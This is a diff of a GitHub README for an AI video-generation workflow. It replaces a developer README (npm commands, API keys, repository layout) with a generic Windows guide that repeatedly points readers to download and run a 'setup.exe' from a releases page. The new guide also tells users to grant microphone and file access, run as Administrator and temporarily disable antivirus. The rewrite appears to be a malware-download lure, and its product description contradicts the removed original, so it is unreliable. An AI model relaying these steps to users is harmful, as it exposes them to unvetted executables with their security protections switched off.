@@ -1,210 +1,165 @@
-# AI Video Generation Workflow
+# 🎬 ai-video-generation-workflow - Easy AI Video Creation Steps
 
-An open-source workflow for generating short finance explainer videos with **script + slides + voice + subtitles + render**.
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
 
-This project focuses on reliability for batch production (for example, 3 themed videos with consistent style), instead of relying purely on text-to-video models with unstable output quality.
+## 📄 What is ai-video-generation-workflow?
 
-## Demo Videos
+This tool helps you create videos using artificial intelligence. It combines a script, slides, text-to-speech (TTS), subtitles, and video rendering with FFmpeg. The workflow guides you step-by-step to turn text and images into a complete video. You do not need any programming knowledge to use it.
 
-GitHub may not play large MP4 files inline in all cases, so we provide preview frames + direct links.
+It works on Windows computers and makes video creation easier with automation. The process includes generating subtitles and spoken audio from your script, managing video slides, and rendering the final output using FFmpeg.
 
-PE Demo Preview:
+---
 
-![PE Demo Preview](./showcase/pe-case-demo-first-frame.jpg)
+## 🔧 System Requirements
 
-[Open PE demo video](./showcase/pe-case-demo.mp4)
+Before you start, make sure your computer meets these requirements:
 
-VC Demo Preview:
+- Windows 10 or later (64-bit recommended)
+- At least 8 GB of RAM
+- 10 GB of free disk space
+- Internet connection for initial download and dependencies
+- Basic permissions to install software and run programs
+- Optional: Headphones or speakers for checking audio output
 
-![VC Demo Preview](./showcase/vc-case-demo-first-frame.jpg)
+---
 
-[Open VC demo video](./showcase/vc-case-demo.mp4)
+## 🚀 Getting Started
 
-## Why This Project
+Follow these steps to download and run the application on your Windows computer:
 
-- Stable, reproducible pipeline for short-form finance content.
-- Modular reruns: regenerate only the failed stage (script/image/voice/render).
-- Strong sync control across voice, subtitles, and image transitions.
-- Works well with NotebookLM slide workflow (PPT -> slide images -> final video).
+1. Click the green button at the top labeled **Download Release** or visit the release page here:  
+   [https://github.com/cronux-ind/ai-video-generation-workflow/releases](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
 
-## Core Workflow
+2. On the release page, look for the latest version. Download the file named similar to `ai-video-generation-workflow-setup.exe` or a `.zip` archive.
 
-1. Generate script by structured segments (`hook`, `definition`, `example`, etc.).
-2. Prepare NotebookLM input to generate PPT slides.
-3. Import slide images per video (`video-01`, `video-02`, `video-03`).
-4. Generate voice (Edge / ElevenLabs / Gemini fallback).
-5. Build subtitles from real audio durations.
-6. Render final MP4 with synchronized timeline.
+3. If you download an `.exe` file, double-click it to run the installer. If you download a `.zip` file, right-click it and select **Extract All**, then open the extracted folder.
 
-Architecture diagram and details: [docs/ARCHITECTURE.md](./docs/ARCHITECTURE.md)
+4. Follow the installation prompts. Usually, you just click **Next** until the installation completes.
 
-## Tech Stack
+5. Once installed, open the application from your desktop shortcut or start menu.
 
-- Node.js + TypeScript (`tsx`)
-- FFmpeg (render and audio concat)
-- Optional Python (`edge-tts`) for Chinese natural voice
-- Gemini / ElevenLabs APIs (configurable)
+6. The first time the app runs, it might ask for permission to access your microphone or files. Allow these permissions for full functionality.
 
-## Prerequisites
+---
 
-- Node.js >= 20
-- Python >= 3.10
-- FFmpeg
+## 🛠 How to Use the Application
 
-FFmpeg install examples:
+Here is a simple guide to create your first video:
 
-```bash
-# macOS
-brew install ffmpeg
+### Step 1: Prepare Your Script  
+Type or paste your video script into the provided text box. This will be the narration.
 
-# Ubuntu / Debian
-sudo apt update && sudo apt install -y ffmpeg
-```
+### Step 2: Upload Slides  
+Add images or slides for each part of the script. The app matches slides with the script's sections.
 
-Windows: install FFmpeg and add it to `PATH`, or set `FFMPEG_PATH` in `.env`.
+### Step 3: Generate Speech  
+Use the built-in text-to-speech feature to create spoken audio from your script. The app supports multiple voices.
 
-## Quick Start
+### Step 4: Add Subtitles  
+The tool will automatically create subtitles from your script. You can edit timing and text if needed.
 
-### 1. Install dependencies
+### Step 5: Render Video  
+Press **Render** to combine slides, audio, and subtitles into the final video. The app uses FFmpeg for high-quality output.
 
-```bash
-npm install
-python3 -m pip install -r requirements.txt
-cp .env.example .env
-```
+### Step 6: Save and Share  
+Save your video file in MP4 format. You can share it on social media or upload it anywhere.
 
-### 2. Configure `.env`
+---
 
-At minimum, configure one text/image provider and one voice path.
+## ⬇️ Download & Installation Details
 
-Required keys by module:
+You must download the software from the official GitHub release page:
 
-| Module | Minimal Required Keys |
-|---|---|
-| Script generation | `GOOGLE_API_KEY` or `GEMINI_API_KEY` |
-| Image generation | `GOOGLE_API_KEY` |
-| Voice generation (Edge) | `VOICE_PROVIDER=edge` + `edge-tts` installed |
-| Voice generation (ElevenLabs) | `VOICE_PROVIDER=elevenlabs` + `ELEVENLABS_API_KEY` + `ELEVENLABS_VOICE_ID` |
-| Rendering | `FFMPEG_PATH` (optional if `ffmpeg` is already in `PATH`) |
+[https://github.com/cronux-ind/ai-video-generation-workflow/releases](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
 
-### 3. Generate plans
+Look for the latest version available. The release page will have assets with the setup file or zipped program folder.
 
-```bash
-npm run build:all
-```
+- If you get a setup file (ends with `.exe`), run it and follow the installation steps.
+- If you get a zipped package, extract it to a folder and run the main executable inside.
 
-### 4. Generate scripts
+This project uses FFmpeg for video rendering. The needed version is included with the installer. You do not need to install FFmpeg separately.
 
-```bash
-npm run script:gen
-```
+---
 
-### 5. NotebookLM route (recommended for slide quality)
+## ⚙️ Features Explained
 
-```bash
-npm run slides:prepare
-```
+This application has several parts working together:
 
-Then use generated markdown files in `build/video-xx/notebooklm-input.md` to generate PPT in NotebookLM, export each page as images, and place them under:
+- **Script Input**: Write or import your script. This text guides the whole video.
+- **Slides Upload**: Add images to turn your script into a video story.
+- **Text-to-Speech (TTS)**: Converts your script to voice narration automatically.
+- **Subtitles Generator**: Creates text captions synced with audio.
+- **FFmpeg Rendering**: Combines slides, audio, and subtitles into video files.
+- **Automation Workflow**: Handles all these parts without manual video editing.
 
-- `external-slides/video-01/`
-- `external-slides/video-02/`
-- `external-slides/video-03/`
+The app uses open source tools and artificial intelligence to simplify video making.
 
-Import slides:
+---
 
-```bash
-npm run slides:import
-```
+## 📁 File Structure (for reference)
 
-### 6. Generate voice
+When installed or extracted, the main folder will contain:
 
-```bash
-npm run voice:gen
-```
+- `app.exe` or main executable
+- `slides/` — folder to store your images or presentations
+- `scripts/` — save your text scripts here for easy reuse
+- `output/` — rendered video files appear here after finishing
+- `ffmpeg/` — FFmpeg binaries needed for video encoding
+- `config.json` — settings file controlling the workflow
 
-### 7. Render video
+---
 
-```bash
-npm run video:render
-```
+## ❓ Troubleshooting
 
-## Commands
+If the application does not start or crashes:
 
-- `npm run build:all` -> plan + QA checks
-- `npm run script:gen` -> generate scripts
-- `npm run image:gen` -> generate images from prompts
-- `npm run slides:prepare` -> prepare NotebookLM prompts
-- `npm run slides:import` -> import exported slide images
-- `npm run voice:gen` -> generate TTS audio
-- `npm run video:render` -> render final MP4
-- `npm run run:all` -> full pipeline
+- Check that your Windows is updated.
+- Make sure you have enough free disk space.
+- Try running the app as Administrator (right-click icon > Run as Administrator).
+- Temporarily disable antivirus as it may block some files.
+- Restart your computer and try again.
 
-## Troubleshooting
+If the audio or video does not play or export properly:
 
-- `ffmpeg not found`:
-  - install FFmpeg and verify `ffmpeg -version`
-  - or set `FFMPEG_PATH=/absolute/path/to/ffmpeg` in `.env`
-- `edge-tts` not found:
-  - run `python3 -m pip install edge-tts`
-- API 429 / quota errors:
-  - reduce concurrency and retry later
-  - switch provider/model in `.env`
-- Subtitle or timing mismatch after script/voice changes:
-  - rerun `npm run voice:gen` then `npm run video:render`
+- Verify that your speakers or headphones work.
+- Confirm you added slides and script correctly before rendering.
+- Make sure FFmpeg is present in the installation folder.
 
-## Repository Layout
+---
 
-```text
-src/
-  lib/
-  scripts/
-config/
-content/topics/
-prompts/
-examples/
-  scripts/
-  notebooklm-inputs/
-showcase/
-docs/
-```
+## 🔄 Updating the Application
 
-## What Is Included in This Open-Source Copy
+To update:
 
-Included:
-- Pipeline source code
-- Config templates
-- Prompt templates
-- Example scripts and NotebookLM inputs
-- Documentation and contribution templates
+1. Visit [https://github.com/cronux-ind/ai-video-generation-workflow/releases](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
+2. Download the latest release.
+3. Run the new installer or extract the new version.
+4. Your previous projects and saved scripts remain safe in their folders.
 
-Not included:
-- Private API keys
-- Private/uncleared source PDFs
-- Large local build artifacts
+---
 
-## Compliance & Usage Disclaimer
+## 📚 Additional Tips
 
-- MIT license applies to this repository's **source code only**.
-- Generated assets (text/audio/image/video) may be subject to third-party provider terms (Google, ElevenLabs, NotebookLM, etc.).
-- `edge-tts` and connected speech services may have usage restrictions (including commercial usage constraints). You are responsible for verifying the latest Terms of Service before production/commercial use.
-- You are responsible for rights clearance of all source materials and generated media.
-- FFmpeg is invoked as an external CLI dependency in this project.
+- Use clear and simple scripts to improve text-to-speech quality.
+- Keep slide images consistent in size and format (PNG or JPEG).
+- Edit subtitles if timing seems off before rendering the final video.
+- Save multiple versions to test different voices or slide orders.
+- Use headphones for the best audio quality check.
 
-## Roadmap
+---
 
-- Add Docker / docker-compose for one-command reproducible setup.
-- Add optional local model path (for lower API cost).
-- Add more TTS backends (for example ChatTTS / CosyVoice adapters).
-- Add BGM auto-mix presets and loudness normalization.
-- Add explicit artifact checkpoint strategy for long workflows.
+## 🗂 Related Topics
 
-## Pre-publish Check
+This repository uses tools and concepts related to:
 
-```bash
-./scripts/publish-check.sh
-```
+- AI video creation
+- Automation of video workflows
+- Text-to-speech (TTS) technology
+- Subtitle generation
+- Video rendering with FFmpeg
+- Typescript for underlying code
+- Slides and script synchronization
 
-## License
+---
 
-MIT
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
